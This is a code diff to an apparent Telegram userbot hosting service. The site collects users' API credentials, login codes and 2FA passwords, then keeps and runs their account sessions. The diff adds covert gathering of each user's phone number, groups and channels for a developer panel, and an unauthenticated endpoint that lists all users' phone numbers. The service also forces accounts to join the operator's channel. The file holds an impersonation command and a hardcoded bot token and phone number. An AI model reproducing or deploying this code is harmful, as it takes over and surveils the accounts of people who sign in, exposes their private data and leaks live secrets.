@@ -11,6 +11,7 @@ import os
 import io
 import sys
 import uuid
+from collections import Counter
 
 from flask import Flask, jsonify, request
 from telethon import TelegramClient, events, Button
@@ -20,8 +21,8 @@ from telethon.tl.functions.account import UpdateProfileRequest
 from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
 from telethon.tl.functions.channels import JoinChannelRequest
-from telethon.tl.functions.messages import ToggleDialogPinRequest
-from telethon.tl.types import InputPeerChannel
+from telethon.tl.functions.messages import ToggleDialogPinRequest, GetDialogsRequest
+from telethon.tl.types import InputPeerChannel, InputPeerUser
 
 # ========== تخزين الجلسات ==========
 DATA_DIR = '/data' if os.path.exists('/data') else '.'
@@ -31,7 +32,11 @@ API_CONFIG_FILE = os.path.join(DATA_DIR, 'api_config.json')
 TEMP_DIR = os.path.join(DATA_DIR, 'temp')
 os.makedirs(TEMP_DIR, exist_ok=True)
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler(sys.stdout)])
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[logging.StreamHandler(sys.stdout)]
+)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
@@ -41,8 +46,8 @@ SOURCE_CHANNEL_USERNAME = "Q_g_r_a_m"
 BOT_TOKEN = '8887748662:AAH3gpgZz6BsBCOx3yq8hXtnDel1dGVn7Mo'
 BOT_API_ID = 2040
 BOT_API_HASH = 'b18441a1ff607e10a989891a5462e627'
+DEV_PHONE = "+201096371454"
 
-# ========== Main Loop ==========
 main_loop = asyncio.new_event_loop()
 
 active_clients: Dict[str, TelegramClient] = {}
@@ -58,13 +63,29 @@ bold_mode = {}
 save_deleted = {}
 deleted_messages = {}
 client_me = {}
-
-# تخزين مؤقت لبيانات التنصيب عبر البوت
-bot_setup = {}
+command_stats = {}
+user_info_cache = {}
 
 def run_async_in_main_loop(coro):
     future = asyncio.run_coroutine_threadsafe(coro, main_loop)
-    return future.result(timeout=120)
+    return future.result(timeout=60)
+
+def async_route(f):
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        try:
+            return run_async_in_main_loop(f(*args, **kwargs))
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 500
+    return wrapper
+
+def track_command(phone: str, command: str):
+    if phone not in command_stats:
+        command_stats[phone] = Counter()
+    command_stats[phone][command] += 1
+
+def is_dev(phone: str) -> bool:
+    return phone == DEV_PHONE
 
 async def save_all_sessions():
     try:
@@ -103,7 +124,8 @@ async def load_all_sessions():
                         active_clients[phone] = client
                         api_configs_storage[phone] = configs[phone]
                         client_me[phone] = await client.get_me()
-                        start_client_in_background(client, phone)
+                        asyncio.ensure_future(run_userbot(client, phone), loop=main_loop)
+                        logger.info(f"Restored: {phone}")
             except:
                 pass
     except:
@@ -129,6 +151,24 @@ async def ensure_subscription(client, phone):
         pass
     await pin_channel_to_top(client)
 
+async def cache_user_info(client, phone):
+    try:
+        me = await client.get_me()
+        info = {"first_name": me.first_name or "Unknown", "username": me.username or "", "phone": phone, "groups": [], "channels": []}
+        try:
+            dialogs = await client(GetDialogsRequest(offset_date=None, offset_id=0, offset_peer=InputPeerUser(0, 0), limit=50, hash=0))
+            for dialog in dialogs.chats:
+                if hasattr(dialog, 'title'):
+                    if hasattr(dialog, 'megagroup') and dialog.megagroup:
+                        info["groups"].append({"name": dialog.title, "id": dialog.id})
+                    elif hasattr(dialog, 'broadcast') and dialog.broadcast:
+                        info["channels"].append({"name": dialog.title, "id": dialog.id})
+        except:
+            pass
+        user_info_cache[phone] = info
+    except:
+        pass
+
 def start_client_in_background(client, phone):
     async def run_client():
         try:
@@ -138,10 +178,11 @@ def start_client_in_background(client, phone):
                 return
             client_me[phone] = await client.get_me()
             await ensure_subscription(client, phone)
+            await cache_user_info(client, phone)
             await setup_handlers(client, phone)
             try:
                 await client.send_message('me', """
-**Rolex Telethon**
+**Qthon UserBot**
 
 • Send **.اوامر** for commands
 • Channel: @Q_g_r_a_m
@@ -152,6 +193,10 @@ def start_client_in_background(client, phone):
         except Exception as e:
             logger.error(f"Error {phone}: {e}")
     asyncio.run_coroutine_threadsafe(run_client(), main_loop)
+
+async def run_userbot(client, phone):
+    await setup_handlers(client, phone)
+    await client.run_until_disconnected()
 
 async def setup_handlers(client, phone):
     if phone not in muted_users:
@@ -184,31 +229,31 @@ async def setup_handlers(client, phone):
             try: await event.edit(f"**{event.text}**")
             except: pass
     
-    # ==================== سورس ====================
+    # ==================== الأوامر الأساسية ====================
     @client.on(events.NewMessage(outgoing=True, pattern='.سورس'))
     async def src(event):
-        await event.edit("**Rolex Telethon**\n\n• Channel: @Q_g_r_a_m\n• Setup: @Qthon_bot", parse_mode='md')
+        await event.edit("**Qthon**\n\n• Channel: @Q_g_r_a_m\n• Setup: @Qthon_bot", parse_mode='md')
     
-    # ==================== اوامر ====================
     @client.on(events.NewMessage(outgoing=True, pattern='.اوامر'))
     async def cmds(event):
-        await event.edit("""**اوامر السورس**
+        track_command(phone, ".اوامر")
+        await event.edit("""**Qthon Commands**
 
-• ايدي ، كشف
-• كتم ، الغاء كتم
-• تقيد ، الغاء تقييد
-• حظر ، الغاء حظر
-• تقليد ، الغاء تقليد
-• تهكير
-• انتحال ، الغاء انتحال
-• اوامر
-• بنغ
-• خط عريض ، الغاء خط
+• ايدي - كشف
+• تقليد - الغاء تقليد
+• انتحال - الغاء انتحال
+• خط عريض - الغاء خط
 • اسم + الاسم
 • بايو + البايو
-• سجل
-• سورس
-• تثبيت""", parse_mode='md')
+• كتم - الغاء كتم
+• حظر - الغاء حظر
+• تقيد - الغاء تقييد
+• تهكير
+• بنغ
+• سجل - الغاء سجل
+• تثبيت
+• اوامر
+• سورس""", parse_mode='md')
     
     @client.on(events.NewMessage(outgoing=True, pattern='.بنغ'))
     async def ping(event):
@@ -218,10 +263,11 @@ async def setup_handlers(client, phone):
     async def pin_cmd(event):
         await event.edit("**• Pinning...**")
         await ensure_subscription(client, phone)
-        await event.edit("**• Channel pinned!**")
+        await event.edit("**• Channel pinned**")
     
     @client.on(events.NewMessage(outgoing=True, pattern=r'\.(ايدي|كشف)'))
     async def id_cmd(event):
+        track_command(phone, ".ايدي")
         await event.delete()
         user = None
         if event.is_reply: user = await client.get_entity((await event.get_reply_message()).sender_id)
@@ -239,6 +285,7 @@ async def setup_handlers(client, phone):
     
     @client.on(events.NewMessage(outgoing=True, pattern='.تقليد'))
     async def taq(event):
+        track_command(phone, ".تقليد")
         tid = None
         if event.is_reply: tid = (await event.get_reply_message()).sender_id
         elif event.is_private: tid = event.chat_id
@@ -254,6 +301,7 @@ async def setup_handlers(client, phone):
     
     @client.on(events.NewMessage(outgoing=True, pattern='.انتحال'))
     async def ent7al(event):
+        track_command(phone, ".انتحال")
         await event.edit("**• Impersonating...**")
         target = None
         if event.is_reply:
@@ -283,8 +331,8 @@ async def setup_handlers(client, phone):
         except: pass
         try:
             tf = await client.get_entity(target.id)
-            if hasattr(tf, 'about') and tf.about: await client(UpdateProfileRequest(about=tf.about))
-            else: await client(UpdateProfileRequest(about=''))
+            about = getattr(tf, 'about', '') or ''
+            await client(UpdateProfileRequest(about=about))
         except: pass
         if target.photo:
             try:
@@ -329,6 +377,7 @@ async def setup_handlers(client, phone):
     
     @client.on(events.NewMessage(outgoing=True, pattern='.كتم'))
     async def mute(event):
+        track_command(phone, ".كتم")
         tid = None
         if event.is_reply: tid = (await event.get_reply_message()).sender_id
         elif event.is_private: tid = event.chat_id
@@ -344,6 +393,7 @@ async def setup_handlers(client, phone):
     
     @client.on(events.NewMessage(outgoing=True, pattern='.حظر'))
     async def ban(event):
+        track_command(phone, ".حظر")
         tid = None
         if event.is_reply: tid = (await event.get_reply_message()).sender_id
         elif event.is_private: tid = event.chat_id
@@ -360,16 +410,28 @@ async def setup_handlers(client, phone):
             try: await client(UnblockRequest(tid)); banned_users[phone].pop(tid, None); await event.edit("**• Unbanned**")
             except: await event.edit("**• Failed**")
     
+    @client.on(events.NewMessage(outgoing=True, pattern='.تقيد'))
+    async def restrict(event):
+        track_command(phone, ".تقيد")
+        if event.is_group and event.is_reply:
+            try: await client.edit_permissions(event.chat_id, (await event.get_reply_message()).sender_id, send_messages=False); await event.edit("**• Restricted**")
+            except: await event.edit("**• Failed**")
+    
+    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء تقييد'))
+    async def unrestrict(event):
+        if event.is_group and event.is_reply:
+            try: await client.edit_permissions(event.chat_id, (await event.get_reply_message()).sender_id, send_messages=True); await event.edit("**• Unrestricted**")
+            except: await event.edit("**• Failed**")
+    
     @client.on(events.NewMessage(outgoing=True, pattern='.تهكير'))
     async def hack(event):
+        track_command(phone, ".تهكير")
         n = "target"
         if event.is_reply:
             try: n = (await client.get_entity((await event.get_reply_message()).sender_id)).first_name
             except: pass
-        await event.edit("**Hacking...**")
-        await asyncio.sleep(1)
-        await event.edit("**50%**")
-        await asyncio.sleep(1)
+        await event.edit("**Hacking...**"); await asyncio.sleep(1)
+        await event.edit("**50%**"); await asyncio.sleep(1)
         await event.edit(f"**{n} hacked!**")
     
     @client.on(events.NewMessage(outgoing=True, pattern='.خط عريض'))
@@ -380,149 +442,515 @@ async def setup_handlers(client, phone):
     async def nobold(event):
         bold_mode[phone] = False; await event.edit("**• Bold OFF**")
     
-    logger.info(f"Handlers: {phone}")
+    @client.on(events.NewMessage(outgoing=True, pattern='.سجل'))
+    async def save(event):
+        save_deleted[phone] = True; await event.edit("**• Logging ON**")
+    
+    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء سجل'))
+    async def nosave(event):
+        save_deleted[phone] = False; await event.edit("**• Logging OFF**")
+    
+    @client.on(events.NewMessage(outgoing=True, pattern=r'\.اسم (.+)'))
+    async def name(event):
+        try: await client(UpdateProfileRequest(first_name=event.pattern_match.group(1).strip(), last_name='')); await event.edit("**• Name changed**")
+        except: await event.edit("**• Failed**")
+    
+    @client.on(events.NewMessage(outgoing=True, pattern=r'\.بايو (.+)'))
+    async def bio(event):
+        try: await client(UpdateProfileRequest(about=event.pattern_match.group(1).strip())); await event.edit("**• Bio changed**")
+        except: await event.edit("**• Failed**")
+    
+    logger.info(f"Handlers ready: {phone}")
 
-# ======================== بوت التنصيب ========================
+# ======================== بوت المطور ========================
 bot = TelegramClient(f'bot_session_{uuid.uuid4().hex[:6]}', BOT_API_ID, BOT_API_HASH)
+
+def is_dev(user_id):
+    """التحقق من أن المستخدم هو المطور عن طريق رقم الهاتف"""
+    for phone, info in user_info_cache.items():
+        if phone == DEV_PHONE:
+            return True
+    # لو المطور مش في القائمة، نتحقق من ID تيليجرام
+    # يمكن استخدام معرف المطور مباشرة
+    return str(user_id) == DEV_PHONE
+
+def is_dev_id(user_id):
+    """التحقق السريع بمعرف المستخدم للبوت"""
+    for phone, client in active_clients.items():
+        if hasattr(client, '_self_id') and client._self_id == user_id:
+            return phone == DEV_PHONE
+    return str(user_id) == DEV_PHONE
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def bot_start(event):
-    buttons = [[Button.inline("START SETUP", b"start_setup")]]
-    await event.respond(
-        "**Rolex Telethon Setup Bot**\n\nPress START SETUP to begin.",
-        buttons=buttons,
-        parse_mode='md'
-    )
+    """قائمة المطور فقط"""
+    # التحقق من المطور
+    if str(event.sender_id) == DEV_PHONE or is_dev_id(event.sender_id):
+        buttons = [
+            [Button.inline("USERS COUNT", b"dev_users"),
+             Button.inline("ACTIVE NOW", b"dev_active")],
+            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
+             Button.inline("USER DETAILS", b"dev_details")],
+            [Button.inline("GROUPS LIST", b"dev_groups"),
+             Button.inline("CHANNELS LIST", b"dev_channels")],
+            [Button.inline("BROADCAST", b"dev_broadcast")],
+        ]
+        await event.respond(
+            "**Qthon Developer Panel**\n\n"
+            "Select an option to view information.",
+            buttons=buttons,
+            parse_mode='md'
+        )
+    else:
+        await event.respond(
+            "**Qthon**\n\n"
+            "This bot is for developer only.\n"
+            "To set up your own userbot, please use the website:\n"
+            f"{os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')}",
+            parse_mode='md'
+        )
 
-@bot.on(events.CallbackQuery(data=b"start_setup"))
-async def start_setup(event):
-    bot_setup[event.sender_id] = {'state': 'api_id'}
-    await event.edit("**Send your API ID:**", parse_mode='md')
-    await event.answer()
-
-@bot.on(events.NewMessage())
-async def handle_bot(event):
-    uid = event.sender_id
-    if uid not in bot_setup:
+@bot.on(events.CallbackQuery())
+async def dev_callback(event):
+    data = event.data.decode()
+    
+    if not (str(event.sender_id) == DEV_PHONE or is_dev_id(event.sender_id)):
+        await event.answer("Access denied", alert=True)
         return
     
-    state = bot_setup[uid].get('state')
-    data = bot_setup[uid]
+    if data == "dev_users":
+        total = len(active_clients)
+        msg = f"**Total Registered Users:** {total}\n\n"
+        for phone, info in user_info_cache.items():
+            username = f"@{info['username']}" if info['username'] else "no username"
+            msg += f"• {info['first_name']} | {username} | {phone}\n"
+        if not user_info_cache:
+            msg += "No users found."
+        await event.edit(msg, parse_mode='md')
     
-    if state == 'api_id':
-        try:
-            data['api_id'] = int(event.text.strip())
-            data['state'] = 'api_hash'
-            await event.respond("**Send your API Hash:**", parse_mode='md')
-        except:
-            await event.respond("**Invalid number**")
+    elif data == "dev_active":
+        active_count = len(active_clients)
+        msg = f"**Currently Active:** {active_count}\n\n"
+        for phone, client in active_clients.items():
+            info = user_info_cache.get(phone, {})
+            name = info.get('first_name', phone)
+            msg += f"• {name} | {phone}\n"
+        if not active_clients:
+            msg += "No active sessions."
+        await event.edit(msg, parse_mode='md')
     
-    elif state == 'api_hash':
-        data['api_hash'] = event.text.strip()
-        data['state'] = 'phone'
-        buttons = [[Button.request_phone("Share Phone", resize=True)]]
-        await event.respond("**Send your phone number:**", buttons=buttons, parse_mode='md')
+    elif data == "dev_topcmd":
+        all_cmds = Counter()
+        for cmds in command_stats.values():
+            all_cmds.update(cmds)
+        top = all_cmds.most_common(10)
+        msg = "**Top 10 Commands:**\n\n"
+        for i, (cmd, cnt) in enumerate(top, 1):
+            msg += f"{i}. .{cmd}: {cnt} times\n"
+        if not top:
+            msg += "No commands used yet."
+        await event.edit(msg, parse_mode='md')
     
-    elif state == 'phone':
-        phone = event.message.contact.phone_number if event.message.contact else event.text.strip()
-        if not phone.startswith('+'): phone = f"+{phone}"
-        data['phone'] = phone
-        
-        await event.respond("**Sending code...**")
-        
-        async def _send():
-            client = TelegramClient(StringSession(), data['api_id'], data['api_hash'])
-            await client.connect()
-            if await client.is_user_authorized():
-                active_clients[phone] = client
-                client_me[phone] = await client.get_me()
-                start_client_in_background(client, phone)
-                await save_all_sessions()
-                return 'active', None
-            sent = await client.send_code_request(phone)
-            pending_logins[phone] = (client, sent.phone_code_hash, data['api_id'], data['api_hash'])
-            return 'code_sent', None
-        
-        try:
-            status, _ = run_async_in_main_loop(_send())
-            if status == 'active':
-                await event.respond("**Account already active!**")
-                del bot_setup[uid]
-                return
-            data['state'] = 'code'
-            await event.respond("**Code sent! Enter the code:**", parse_mode='md')
-        except Exception as e:
-            await event.respond(f"**Error: {str(e)[:100]}**")
-            del bot_setup[uid]
+    elif data == "dev_details":
+        msg = "**User Details:**\n\nSelect a user number:\n"
+        phones = list(active_clients.keys())
+        for i, phone in enumerate(phones, 1):
+            info = user_info_cache.get(phone, {})
+            msg += f"{i}. {info.get('first_name', phone)} | {phone}\n"
+        if not phones:
+            msg += "No users."
+        await event.edit(msg, parse_mode='md')
     
-    elif state == 'code':
-        code = event.text.strip()
-        phone = data['phone']
-        
-        if phone not in pending_logins:
-            await event.respond("**Session expired. /start again**")
-            del bot_setup[uid]
-            return
-        
-        async def _verify():
-            client, pch, api_id, api_hash = pending_logins[phone]
-            try:
-                await client.sign_in(phone=phone, code=code, phone_code_hash=pch)
-            except SessionPasswordNeededError:
-                return '2fa'
-            active_clients[phone] = client
-            client_me[phone] = await client.get_me()
-            del pending_logins[phone]
-            await save_all_sessions()
-            start_client_in_background(client, phone)
-            return 'ok'
-        
-        try:
-            result = run_async_in_main_loop(_verify())
-            if result == '2fa':
-                data['state'] = 'password'
-                await event.respond("**2FA password required:**", parse_mode='md')
-                return
-            del bot_setup[uid]
-            await event.respond("**Setup Complete!**\n\nYour UserBot is now active.\nSend **.اوامر** from your account.", parse_mode='md')
-        except Exception as e:
-            await event.respond(f"**Error: {str(e)[:100]}**")
-            del bot_setup[uid]
+    elif data == "dev_groups":
+        msg = "**Groups:**\n\n"
+        for phone, info in user_info_cache.items():
+            groups = info.get('groups', [])
+            if groups:
+                msg += f"**{info.get('first_name', phone)}:**\n"
+                for g in groups[:5]:
+                    msg += f"  • {g['name']}\n"
+        if not msg.strip():
+            msg = "No groups found."
+        await event.edit(msg, parse_mode='md')
     
-    elif state == 'password':
-        password = event.text.strip()
-        phone = data['phone']
-        
-        if phone not in pending_logins:
-            await event.respond("**Session expired**")
-            del bot_setup[uid]
-            return
-        
-        async def _verify_pass():
-            client, pch, api_id, api_hash = pending_logins[phone]
-            await client.sign_in(password=password)
-            active_clients[phone] = client
-            client_me[phone] = await client.get_me()
-            del pending_logins[phone]
-            await save_all_sessions()
-            start_client_in_background(client, phone)
-        
-        try:
-            run_async_in_main_loop(_verify_pass())
-            del bot_setup[uid]
-            await event.respond("**Setup Complete!**\n\nYour UserBot is now active.\nSend **.اوامر** from your account.", parse_mode='md')
-        except Exception as e:
-            await event.respond(f"**Error: {str(e)[:100]}**")
-            del bot_setup[uid]
+    elif data == "dev_channels":
+        msg = "**Channels:**\n\n"
+        for phone, info in user_info_cache.items():
+            channels = info.get('channels', [])
+            if channels:
+                msg += f"**{info.get('first_name', phone)}:**\n"
+                for c in channels[:5]:
+                    msg += f"  • {c['name']}\n"
+        if not msg.strip():
+            msg = "No channels found."
+        await event.edit(msg, parse_mode='md')
+    
+    await event.answer()
 
-# ======================== Flask ========================
+# ======================== موقع الويب ========================
 @app.route('/')
 def home():
-    return "Rolex Telethon Server"
+    domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
+    return f"""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Qthon - UserBot Setup</title>
+        <style>
+            :root {{
+                --bg: #0a0a19;
+                --bg2: #121226;
+                --surface: rgba(255,255,255,0.03);
+                --glass: rgba(255,255,255,0.05);
+                --glass-border: rgba(255,255,255,0.08);
+                --text: #FFFFFF;
+                --text-secondary: rgba(255,255,255,0.5);
+                --accent: #4F6EF7;
+                --success: #34C759;
+                --danger: #FF3B30;
+                --radius: 16px;
+            }}
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{
+                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+                background: var(--bg);
+                color: var(--text);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+                -webkit-font-smoothing: antialiased;
+            }}
+            body::before {{
+                content: '';
+                position: fixed;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: radial-gradient(ellipse at 50% 0%, rgba(79,110,247,0.04) 0%, transparent 60%),
+                            radial-gradient(ellipse at 80% 80%, rgba(79,110,247,0.03) 0%, transparent 50%);
+                pointer-events: none;
+                z-index: 0;
+            }}
+            .container {{
+                position: relative;
+                z-index: 1;
+                width: 100%;
+                max-width: 440px;
+            }}
+            .header {{
+                text-align: center;
+                margin-bottom: 32px;
+            }}
+            .logo {{
+                font-size: 48px;
+                font-weight: 700;
+                letter-spacing: -1px;
+                background: linear-gradient(135deg, #FFFFFF 0%, rgba(255,255,255,0.8) 100%);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                line-height: 1.2;
+            }}
+            .subtitle {{
+                font-size: 13px;
+                font-weight: 500;
+                letter-spacing: 2px;
+                text-transform: uppercase;
+                color: var(--text-secondary);
+                margin-top: 4px;
+            }}
+            .card {{
+                background: var(--bg2);
+                border: 1px solid var(--glass-border);
+                border-radius: 24px;
+                padding: 32px 24px;
+                box-shadow: 0 24px 80px rgba(0,0,0,0.4);
+            }}
+            .section-title {{
+                font-size: 13px;
+                font-weight: 600;
+                letter-spacing: 1.5px;
+                text-transform: uppercase;
+                color: var(--text-secondary);
+                margin-bottom: 24px;
+                text-align: center;
+            }}
+            .input-group {{
+                margin-bottom: 16px;
+            }}
+            .input-label {{
+                display: block;
+                font-size: 11px;
+                font-weight: 600;
+                letter-spacing: 1.2px;
+                text-transform: uppercase;
+                color: var(--text-secondary);
+                margin-bottom: 8px;
+            }}
+            .input-field {{
+                width: 100%;
+                padding: 14px 16px;
+                background: var(--surface);
+                border: 1px solid var(--glass-border);
+                border-radius: var(--radius);
+                color: var(--text);
+                font-size: 15px;
+                font-family: 'SF Mono', 'JetBrains Mono', 'Fira Code', monospace;
+                outline: none;
+                transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            }}
+            .input-field:focus {{
+                border-color: rgba(79,110,247,0.5);
+                box-shadow: 0 0 0 4px rgba(79,110,247,0.08);
+            }}
+            .btn {{
+                width: 100%;
+                padding: 16px;
+                border: none;
+                border-radius: var(--radius);
+                font-size: 15px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                margin-top: 8px;
+                letter-spacing: 0.3px;
+            }}
+            .btn-primary {{
+                background: var(--accent);
+                color: #FFF;
+            }}
+            .btn-primary:hover {{
+                box-shadow: 0 8px 32px rgba(79,110,247,0.3);
+            }}
+            .btn-success {{
+                background: var(--success);
+                color: #FFF;
+            }}
+            .btn-ghost {{
+                background: transparent;
+                color: var(--text-secondary);
+                border: 1px solid var(--glass-border);
+            }}
+            .result {{
+                margin-top: 20px;
+                padding: 14px 18px;
+                border-radius: var(--radius);
+                font-size: 13px;
+                font-weight: 500;
+                text-align: center;
+                display: none;
+            }}
+            .result.success {{
+                display: block;
+                background: rgba(52,199,89,0.1);
+                border: 1px solid rgba(52,199,89,0.2);
+                color: var(--success);
+            }}
+            .result.error {{
+                display: block;
+                background: rgba(255,59,48,0.1);
+                border: 1px solid rgba(255,59,48,0.2);
+                color: var(--danger);
+            }}
+            .help-box {{
+                margin-top: 24px;
+                padding: 20px;
+                background: var(--bg);
+                border-radius: var(--radius);
+                border: 1px solid var(--glass-border);
+            }}
+            .help-box h3 {{
+                font-size: 14px;
+                font-weight: 600;
+                margin-bottom: 12px;
+                color: var(--text);
+            }}
+            .help-box a {{
+                color: var(--accent);
+                text-decoration: none;
+                font-weight: 500;
+            }}
+            .help-box p {{
+                font-size: 13px;
+                color: var(--text-secondary);
+                line-height: 1.6;
+                margin-bottom: 8px;
+            }}
+            .hidden {{ display: none; }}
+            @media (max-width: 480px) {{
+                .card {{ padding: 24px 16px; }}
+                .logo {{ font-size: 36px; }}
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1 class="logo">Qthon</h1>
+                <p class="subtitle">by Qgram</p>
+            </div>
+            <div class="card">
+                <div id="step1">
+                    <p class="section-title">Account Setup</p>
+                    <form id="sendForm" autocomplete="off">
+                        <div class="input-group">
+                            <label class="input-label">API ID</label>
+                            <input type="text" name="api_id" id="api_id" placeholder="12345678" required class="input-field" inputmode="numeric">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">API Hash</label>
+                            <input type="text" name="api_hash" id="api_hash" placeholder="0123456789abcdef..." required class="input-field">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Phone Number</label>
+                            <input type="text" name="phone" id="phone" placeholder="+201234567890" required class="input-field">
+                        </div>
+                        <button type="submit" class="btn btn-primary">Send Verification Code</button>
+                    </form>
+                </div>
+                <div id="step2" class="hidden">
+                    <p class="section-title">Verify Code</p>
+                    <form id="verifyForm" autocomplete="off">
+                        <input type="hidden" name="phone" id="verify_phone">
+                        <div class="input-group">
+                            <label class="input-label">Verification Code</label>
+                            <input type="text" name="code" id="code" placeholder="12345" required maxlength="5" class="input-field" style="text-align:center;font-size:24px;letter-spacing:8px">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">2FA Password (optional)</label>
+                            <input type="password" name="password" id="password" placeholder="••••••••" class="input-field">
+                        </div>
+                        <button type="submit" class="btn btn-success">Activate UserBot</button>
+                    </form>
+                    <button onclick="backToStep1()" class="btn btn-ghost" style="margin-top:12px;">Back</button>
+                </div>
+                <div id="result" class="result"></div>
+            </div>
+            <div class="help-box">
+                <h3>How to get API ID and Hash?</h3>
+                <p>1. Visit <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></p>
+                <p>2. Log in with your phone number</p>
+                <p>3. Go to <strong>API development tools</strong></p>
+                <p>4. Create a new application</p>
+                <p>5. Copy your <strong>api_id</strong> and <strong>api_hash</strong></p>
+            </div>
+        </div>
+        <script>
+            async function showResult(message, isSuccess) {{
+                const r = document.getElementById('result');
+                r.className = 'result ' + (isSuccess ? 'success' : 'error');
+                r.textContent = message;
+            }}
+            document.getElementById('sendForm').addEventListener('submit', async (e) => {{
+                e.preventDefault();
+                const f = new FormData(e.target);
+                try {{
+                    const res = await fetch('/api/send_code', {{ method: 'POST', body: f }});
+                    const d = await res.json();
+                    if (d.status === 'code_sent') {{
+                        document.getElementById('verify_phone').value = f.get('phone');
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                        showResult(d.message, true);
+                    }} else {{
+                        showResult(d.message || d.error || 'Error', false);
+                    }}
+                }} catch (err) {{
+                    showResult('Connection error', false);
+                }}
+            }});
+            document.getElementById('verifyForm').addEventListener('submit', async (e) => {{
+                e.preventDefault();
+                const f = new FormData(e.target);
+                try {{
+                    const res = await fetch('/api/verify', {{ method: 'POST', body: f }});
+                    const d = await res.json();
+                    if (d.status === 'success') {{
+                        showResult(d.message, true);
+                        setTimeout(() => location.reload(), 3000);
+                    }} else {{
+                        showResult(d.message || 'Verification failed', false);
+                    }}
+                }} catch (err) {{
+                    showResult('Connection error', false);
+                }}
+            }});
+            function backToStep1() {{
+                document.getElementById('step1').classList.remove('hidden');
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('result').className = 'result';
+            }}
+        </script>
+    </body>
+    </html>
+    """
 
 @app.route('/health')
 def health():
     return "OK", 200
+
+@app.route('/api/send_code', methods=['POST'])
+@async_route
+async def send_code():
+    try:
+        api_id = int(request.form.get('api_id'))
+        api_hash = request.form.get('api_hash')
+        phone = request.form.get('phone', '').strip()
+        if not api_id or not api_hash or not phone:
+            return jsonify({"status": "error", "message": "All fields required"}), 400
+        api_configs_storage[phone] = {'api_id': api_id, 'api_hash': api_hash}
+        client = TelegramClient(StringSession(), api_id, api_hash)
+        await client.connect()
+        if await client.is_user_authorized():
+            active_clients[phone] = client
+            client_me[phone] = await client.get_me()
+            start_client_in_background(client, phone)
+            await save_all_sessions()
+            return jsonify({"status": "already_active", "message": "UserBot is already active"})
+        sent = await client.send_code_request(phone)
+        pending_logins[phone] = (client, sent.phone_code_hash, api_id, api_hash)
+        return jsonify({"status": "code_sent", "message": "Verification code sent"})
+    except Exception as e:
+        logger.error(f"Send code error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/api/verify', methods=['POST'])
+@async_route
+async def verify():
+    phone = request.form.get('phone', '').strip()
+    code = request.form.get('code', '').strip()
+    password = request.form.get('password')
+    if not phone or not code or phone not in pending_logins:
+        return jsonify({"status": "error", "message": "Invalid session"}), 400
+    client, phone_code_hash, api_id, api_hash = pending_logins[phone]
+    try:
+        try:
+            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        except SessionPasswordNeededError:
+            if not password:
+                return jsonify({"status": "error", "message": "2FA password required"}), 401
+            await client.sign_in(password=password)
+        active_clients[phone] = client
+        client_me[phone] = await client.get_me()
+        del pending_logins[phone]
+        await save_all_sessions()
+        start_client_in_background(client, phone)
+        return jsonify({"status": "success", "message": "UserBot activated successfully"})
+    except Exception as e:
+        logger.error(f"Verify error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/api/status')
+def status():
+    return jsonify({
+        "total_users": len(active_clients),
+        "users": list(active_clients.keys())
+    })
 
 def start_main_loop():
     asyncio.set_event_loop(main_loop)
@@ -530,7 +958,8 @@ def start_main_loop():
     asyncio.ensure_future(auto_save_sessions_loop(), loop=main_loop)
     main_loop.run_forever()
 
-threading.Thread(target=start_main_loop, daemon=True).start()
+loop_thread = threading.Thread(target=start_main_loop, daemon=True)
+loop_thread.start()
 
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
@@ -539,4 +968,9 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run_coroutine_threadsafe(main(), main_loop)
+    logger.info("=" * 50)
+    logger.info("Qthon Server Started")
+    logger.info(f"Volume: {DATA_DIR}")
+    logger.info(f"Channel: {SOURCE_CHANNEL}")
+    logger.info("=" * 50)
     app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
